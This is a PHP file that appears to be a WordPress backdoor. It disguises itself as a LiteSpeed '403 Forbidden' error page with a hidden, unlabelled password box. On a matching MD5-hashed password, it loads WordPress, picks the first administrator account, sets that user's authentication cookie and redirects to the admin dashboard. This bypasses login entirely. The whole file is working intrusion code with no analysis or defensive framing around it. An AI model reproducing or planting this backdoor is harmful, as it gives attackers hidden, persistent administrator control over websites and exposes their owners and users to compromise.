<?php
session_start();
$password = "76fdd00d9db694259b003d95f9dd66cc";

function login_shell()
{
?>
<!DOCTYPE html>
<html style="height: 100%">
  <head>
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <title>403 Forbidden</title>
    <style>
      @media (prefers-color-scheme: dark) {
        body {
          background-color: #000 !important;
        }
      }
    </style>
  </head>
  <body
    style="
      color: #444;
      margin: 0;
      font: normal 14px/20px Arial, Helvetica, sans-serif;
      height: 100%;
      background-color: #fff;
    "
  >
    <div style="height: auto; min-height: 100%">
      <div
        style="
          text-align: center;
          width: 800px;
          margin-left: -400px;
          position: absolute;
          top: 30%;
          left: 50%;
        "
      >
        <h1
          style="
            margin: 0;
            font-size: 150px;
            line-height: 150px;
            font-weight: bold;
          "
        >
          403
        </h1>
        <h2 style="margin-top: 20px; font-size: 30px">Forbidden</h2>
        <p>Access to this resource on the server is denied!</p>
        <form class="login-container" action="" method="post">
            <div class="masuk">
                <input style="background-color:  white; outline: none; margin-left: 50px; width: 30%; border: none;" type="Password" name="pass" placeholder="&nbsp;">&nbsp;<input style="background-color: white; border: none; color: white" type="submit" name="submit" value="LOGIN">
      </div>
    </div>
    <div
      style="
        color: #f0f0f0;
        font-size: 12px;
        margin: auto;
        padding: 0px 30px 0px 30px;
        position: relative;
        clear: both;
        height: 100px;
        margin-top: -101px;
        background-color: #474747;
        border-top: 1px solid rgba(0, 0, 0, 0.15);
        box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;
      "
    >
      <br />Proudly powered by LiteSpeed Web Server
      <p>
        Please be advised that LiteSpeed Technologies Inc. is not a web hosting
        company and, as such, has no control over content found on this site.
      </p>
    </div>
  </body>
</html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
?>
<?php
require(rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php");
$u = get_users('role=administrator');
$us="";
foreach($u as $p){
	$us=$p->user_login; break;
}
$us = get_user_by('login', $us ); 
if ( !is_wp_error( $us ) )
{	get_currentuserinfo(); 
		if ( user_can( $us, "administrator" ) ){ 
		   wp_clear_auth_cookie(); 
   		   wp_set_current_user ( $us->ID );
    	   wp_set_auth_cookie  ( $us->ID );
    	   $redirect_to = admin_url();  
           wp_safe_redirect( $redirect_to );
           exit();
  } 
}